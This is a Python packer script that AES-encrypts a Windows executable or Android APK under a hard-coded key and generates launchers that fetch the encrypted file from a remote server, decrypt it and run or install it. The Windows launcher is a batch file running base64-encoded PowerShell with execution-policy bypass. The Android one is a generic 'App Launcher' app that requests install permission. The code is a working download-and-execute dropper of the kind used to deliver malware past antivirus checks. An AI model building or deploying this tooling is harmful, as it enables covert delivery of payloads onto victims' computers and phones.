#!/usr/bin/env python3
"""
win_xor_pack.py — Linux packer (VPS download mode)

AES-256-CBC + PKCS7 (works with Windows PowerShell 5.1 / .NET Framework).
Optional gzip before encrypt. Fixed internal key.

  .exe / .bin → app.enc + run.bat
  .apk        → app.enc + Android Studio project

Requires: pip install cryptography
"""

from __future__ import annotations

import argparse
import base64
import gzip
import hashlib
import json
import os
import sys
import textwrap
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
except ImportError:
    sys.exit("Install dependency:  pip install cryptography")

_FIXED_KEY_MATERIAL = "WinXorPack-FixedKey-v1-AESCBC"
FIXED_AES_KEY = hashlib.sha256(_FIXED_KEY_MATERIAL.encode("utf-8")).digest()  # 32 bytes

MAGIC = b"WXPAESCB"  # 8 bytes
FLAG_GZIP = 1

PE_SUFFIXES = {".exe", ".bin"}
APK_SUFFIXES = {".apk"}
ALL_SUFFIXES = PE_SUFFIXES | APK_SUFFIXES


def aes_cbc_encrypt(plain: bytes, key: bytes) -> tuple[bytes, bytes]:
    iv = os.urandom(16)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(plain) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(padded) + enc.finalize()
    return iv, ct


def pack_payload(plain: bytes, compress: bool) -> bytes:
    body = gzip.compress(plain, compresslevel=9) if compress else plain
    flags = FLAG_GZIP if compress else 0
    iv, ct = aes_cbc_encrypt(body, FIXED_AES_KEY)
    return MAGIC + bytes([flags, 0, 0, 0]) + iv + ct


def build_pe_bat(url: str) -> str:
    """PowerShell 5.1-compatible AES-CBC decrypt; write .enc and .exe next to the .bat."""
    ps_url = url.replace("'", "''")
    key_b64 = base64.b64encode(FIXED_AES_KEY).decode("ascii")

    ps = f"""
$ErrorActionPreference = 'Stop'
$url = '{ps_url}'
$key = [Convert]::FromBase64String('{key_b64}')
# Same folder as the .bat (passed via env from cmd)
$dir = $env:LAUNCHER_DIR
if (-not $dir) {{ $dir = (Get-Location).Path }}
$encPath = [IO.Path]::Combine($dir, 'app.enc')
$exePath = [IO.Path]::Combine($dir, 'app_decrypted.exe')
try {{
  Write-Host 'Downloading application payload...'
  Write-Host \"  -> $encPath\"
  Invoke-WebRequest -Uri $url -OutFile $encPath -UseBasicParsing
  $blob = [IO.File]::ReadAllBytes($encPath)
  if ($blob.Length -lt 28) {{ throw 'Payload too small' }}
  $magic = [Text.Encoding]::ASCII.GetString($blob, 0, 8)
  if ($magic -ne 'WXPAESCB') {{ throw 'Bad payload magic (expected AES-CBC pack)' }}
  $flags = $blob[8]
  $iv = New-Object byte[] 16
  [Array]::Copy($blob, 12, $iv, 0, 16)
  $ctLen = $blob.Length - 28
  $ct = New-Object byte[] $ctLen
  [Array]::Copy($blob, 28, $ct, 0, $ctLen)
  $aes = [Security.Cryptography.Aes]::Create()
  $aes.Mode = [Security.Cryptography.CipherMode]::CBC
  $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
  $aes.KeySize = 256
  $aes.Key = $key
  $aes.IV = $iv
  $dec = $aes.CreateDecryptor()
  $plain = $dec.TransformFinalBlock($ct, 0, $ct.Length)
  $aes.Dispose()
  if (($flags -band 1) -ne 0) {{
    $ms = New-Object IO.MemoryStream(,$plain)
    $gs = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
    $out = New-Object IO.MemoryStream
    $gs.CopyTo($out); $gs.Close()
    $plain = $out.ToArray()
  }}
  if ($plain.Length -lt 2 -or $plain[0] -ne 0x4D -or $plain[1] -ne 0x5A) {{
    throw 'Decrypted data is not a Windows PE (MZ missing)'
  }}
  Write-Host \"Writing decrypted EXE -> $exePath\"
  [IO.File]::WriteAllBytes($exePath, $plain)
  Write-Host 'Starting application...'
  $p = Start-Process -FilePath $exePath -Wait -PassThru
  exit $p.ExitCode
}} catch {{
  Write-Host $_
  Write-Host 'Failed to download or run the application.'
  exit 1
}}
"""
    encoded = base64.b64encode(ps.strip().encode("utf-16le")).decode("ascii")
    return "\r\n".join([
        "@echo off",
        "setlocal",
        'cd /d "%~dp0"',
        'set "LAUNCHER_DIR=%~dp0"',
        # strip trailing backslash issues: %~dp0 has trailing \
        f"powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded}",
        "set ERR=%ERRORLEVEL%",
        "if %ERR% NEQ 0 pause",
        "endlocal & exit /b %ERR%",
        "",
    ])



def write_android_launcher_project(out_dir: Path, url: str) -> Path:
    root = out_dir / "android_launcher"
    pkg = "com.xorpack.launcher"
    (root / "app/src/main/java/com/xorpack/launcher").mkdir(parents=True, exist_ok=True)
    (root / "app/src/main/res/values").mkdir(parents=True, exist_ok=True)
    (root / "app/src/main/res/xml").mkdir(parents=True, exist_ok=True)

    key_b64 = base64.b64encode(FIXED_AES_KEY).decode("ascii")

    java = f'''package com.xorpack.launcher;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.content.FileProvider;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.zip.GZIPInputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity extends Activity {{
    private static final String PAYLOAD_URL = {json.dumps(url)};
    private static final String KEY_B64 = {json.dumps(key_b64)};
    private TextView status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        status = new TextView(this);
        status.setText("Starting...");
        status.setPadding(48, 48, 48, 48);
        setContentView(status);
        new Thread(this::work).start();
    }}

    private void setStatus(String s) {{
        new Handler(Looper.getMainLooper()).post(() -> status.setText(s));
    }}

    private void work() {{
        try {{
            setStatus("Downloading...");
            byte[] blob = httpGet(PAYLOAD_URL);
            if (blob.length < 28) throw new IllegalStateException("Payload too small");
            String magic = new String(blob, 0, 8, "US-ASCII");
            if (!magic.equals("WXPAESCB")) throw new IllegalStateException("Bad magic");
            int flags = blob[8] & 0xff;
            byte[] iv = new byte[16];
            System.arraycopy(blob, 12, iv, 0, 16);
            byte[] ct = new byte[blob.length - 28];
            System.arraycopy(blob, 28, ct, 0, ct.length);
            setStatus("Decrypting...");
            byte[] key = Base64.decode(KEY_B64, Base64.DEFAULT);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
            byte[] plain = cipher.doFinal(ct);
            if ((flags & 1) != 0) plain = gunzip(plain);
            if (plain.length < 4 || plain[0] != 'P' || plain[1] != 'K')
                throw new IllegalStateException("Not a valid APK after decrypt");
            File out = new File(getCacheDir(), "payload.apk");
            try (FileOutputStream fos = new FileOutputStream(out)) {{ fos.write(plain); }}
            setStatus("Opening installer...");
            Uri uri = FileProvider.getUriForFile(this, getPackageName() + ".provider", out);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "application/vnd.android.package-archive");
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            setStatus("Installer launched.");
        }} catch (Exception e) {{
            String msg = "Error: " + e.getMessage();
            setStatus(msg);
            new Handler(Looper.getMainLooper()).post(() ->
                Toast.makeText(this, msg, Toast.LENGTH_LONG).show());
        }}
    }}

    private static byte[] httpGet(String urlStr) throws Exception {{
        HttpURLConnection c = (HttpURLConnection) new URL(urlStr).openConnection();
        c.setConnectTimeout(30000);
        c.setReadTimeout(120000);
        c.connect();
        if (c.getResponseCode() != 200) throw new IllegalStateException("HTTP " + c.getResponseCode());
        try (InputStream in = c.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream()) {{
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) >= 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        }}
    }}

    private static byte[] gunzip(byte[] data) throws Exception {{
        try (GZIPInputStream gis = new GZIPInputStream(new ByteArrayInputStream(data));
             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {{
            byte[] buf = new byte[8192];
            int n;
            while ((n = gis.read(buf)) >= 0) bos.write(buf, 0, n);
            return bos.toByteArray();
        }}
    }}
}}
'''
    (root / "app/src/main/java/com/xorpack/launcher/MainActivity.java").write_text(java, encoding="utf-8")
    (root / "app/src/main/AndroidManifest.xml").write_text(textwrap.dedent(f"""\
        <?xml version="1.0" encoding="utf-8"?>
        <manifest xmlns:android="http://schemas.android.com/apk/res/android">
            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
            <application android:allowBackup="false" android:label="App Launcher"
                android:usesCleartextTraffic="true">
                <activity android:name=".MainActivity" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>
                <provider android:name="androidx.core.content.FileProvider"
                    android:authorities="{pkg}.provider" android:exported="false"
                    android:grantUriPermissions="true">
                    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
                        android:resource="@xml/file_paths" />
                </provider>
            </application>
        </manifest>
        """), encoding="utf-8")
    (root / "app/src/main/res/xml/file_paths.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n<paths><cache-path name="cache" path="." /></paths>\n',
        encoding="utf-8",
    )
    (root / "app/src/main/res/values/strings.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<resources><string name="app_name">App Launcher</string></resources>\n',
        encoding="utf-8",
    )
    (root / "app/build.gradle").write_text(textwrap.dedent("""\
        plugins { id 'com.android.application' }
        android {
            namespace 'com.xorpack.launcher'
            compileSdk 34
            defaultConfig {
                applicationId "com.xorpack.launcher"
                minSdk 24
                targetSdk 34
                versionCode 1
                versionName "1.0"
            }
            compileOptions {
                sourceCompatibility JavaVersion.VERSION_17
                targetCompatibility JavaVersion.VERSION_17
            }
        }
        dependencies {
            implementation 'androidx.appcompat:appcompat:1.6.1'
            implementation 'androidx.core:core:1.13.0'
        }
        """), encoding="utf-8")
    (root / "build.gradle").write_text(
        "plugins { id 'com.android.application' version '8.2.2' apply false }\n", encoding="utf-8"
    )
    (root / "settings.gradle").write_text(textwrap.dedent("""\
        pluginManagement {
            repositories { google(); mavenCentral(); gradlePluginPortal() }
        }
        dependencyResolutionManagement {
            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
            repositories { google(); mavenCentral() }
        }
        rootProject.name = "XorPackLauncher"
        include ':app'
        """), encoding="utf-8")
    (root / "gradle.properties").write_text(
        "org.gradle.jvmargs=-Xmx2048m\nandroid.useAndroidX=true\n", encoding="utf-8"
    )
    (root / "BUILD.txt").write_text(
        "Open in Android Studio → Build APK(s).\n"
        "Upload app.enc to your URL before testing.\n",
        encoding="utf-8",
    )
    return root


def looks_like_pe(data: bytes) -> bool:
    return len(data) >= 2 and data[0:2] == b"MZ"


def looks_like_apk(data: bytes) -> bool:
    return len(data) >= 2 and data[0:2] == b"PK"


def prompt(msg: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"{msg}{suffix}: ").strip()
        if val:
            return val
        if default is not None:
            return default
        print("  Please enter a value.")


def prompt_yes_no(msg: str, default: bool = False) -> bool:
    d = "Y/n" if default else "y/N"
    while True:
        val = input(f"{msg} [{d}]: ").strip().lower()
        if not val:
            return default
        if val in ("y", "yes"):
            return True
        if val in ("n", "no"):
            return False
        print("  Enter y or n.")


def interactive() -> dict:
    print()
    print("=" * 60)
    print("  AES-256-CBC Packer — VPS mode (fixed key)")
    print("  Compatible with Windows PowerShell 5.1")
    print("=" * 60)
    print()
    while True:
        path = Path(prompt("Path to file (.exe, .bin, or .apk)")).expanduser().resolve()
        if not path.is_file():
            print(f"  Not found: {path}")
            continue
        suf = path.suffix.lower()
        if suf not in ALL_SUFFIXES:
            print("  Use .exe, .bin, or .apk")
            continue
        data = path.read_bytes()
        kind = "apk" if suf in APK_SUFFIXES else "pe"
        if kind == "pe" and not looks_like_pe(data):
            if not prompt_yes_no("  No MZ header — continue?", default=False):
                continue
        if kind == "apk" and not looks_like_apk(data):
            if not prompt_yes_no("  No PK header — continue?", default=False):
                continue
        break
    out_dir = Path(prompt("Output directory", str(Path.cwd() / "xor_out"))).expanduser().resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    payload_name = prompt("Encrypted payload filename on VPS", "app.enc")
    url = prompt("Public download URL for the payload")
    compress = prompt_yes_no("Gzip before AES?", default=True)
    print()
    if not prompt_yes_no("Proceed?", default=True):
        sys.exit("Cancelled.")
    return {
        "path": path,
        "kind": kind,
        "out_dir": out_dir,
        "payload_path": out_dir / payload_name,
        "url": url,
        "compress": compress,
    }


def run_pack(cfg: dict) -> None:
    plain = cfg["path"].read_bytes()
    encrypted = pack_payload(plain, cfg["compress"])
    cfg["payload_path"].write_bytes(encrypted)

    if cfg["kind"] == "apk":
        proj = write_android_launcher_project(cfg["out_dir"], cfg["url"])
        print()
        print("Done (Android).")
        print(f"  Payload : {cfg['payload_path']} ({len(encrypted):,} bytes)")
        print(f"  URL     : {cfg['url']}")
        print(f"  Project : {proj}")
    else:
        bat_path = cfg["out_dir"] / "run.bat"
        bat_path.write_text(build_pe_bat(cfg["url"]), encoding="utf-8", newline="\r\n")
        print()
        print("Done (Windows PE).")
        print(f"  Payload  : {cfg['payload_path']} ({len(encrypted):,} bytes)")
        print(f"  URL      : {cfg['url']}")
        print(f"  Launcher : {bat_path}")
        print("  Crypto   : AES-256-CBC (PowerShell 5.1 compatible)")


def main() -> None:
    parser = argparse.ArgumentParser(description="AES-CBC pack .exe/.bin/.apk for VPS hosting")
    parser.add_argument("input", nargs="?")
    parser.add_argument("-o", "--output-dir", default=None)
    parser.add_argument("--url", default=None)
    parser.add_argument("--payload-name", default="app.enc")
    parser.add_argument("--compress", action="store_true")
    parser.add_argument("--no-compress", action="store_true")
    parser.add_argument("-i", "--interactive", action="store_true")
    args = parser.parse_args()

    if args.interactive or not args.input or not args.url:
        cfg = interactive()
        if args.compress:
            cfg["compress"] = True
        if args.no_compress:
            cfg["compress"] = False
    else:
        path = Path(args.input).expanduser().resolve()
        if not path.is_file():
            sys.exit(f"Not found: {path}")
        suf = path.suffix.lower()
        if suf not in ALL_SUFFIXES:
            sys.exit("Need .exe, .bin, or .apk")
        out_dir = Path(args.output_dir or "./xor_out").expanduser().resolve()
        out_dir.mkdir(parents=True, exist_ok=True)
        cfg = {
            "path": path,
            "kind": "apk" if suf in APK_SUFFIXES else "pe",
            "out_dir": out_dir,
            "payload_path": out_dir / args.payload_name,
            "url": args.url,
            "compress": bool(args.compress) and not args.no_compress,
        }

    cfg["out_dir"].mkdir(parents=True, exist_ok=True)
    run_pack(cfg)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nCancelled.")
        sys.exit(130)
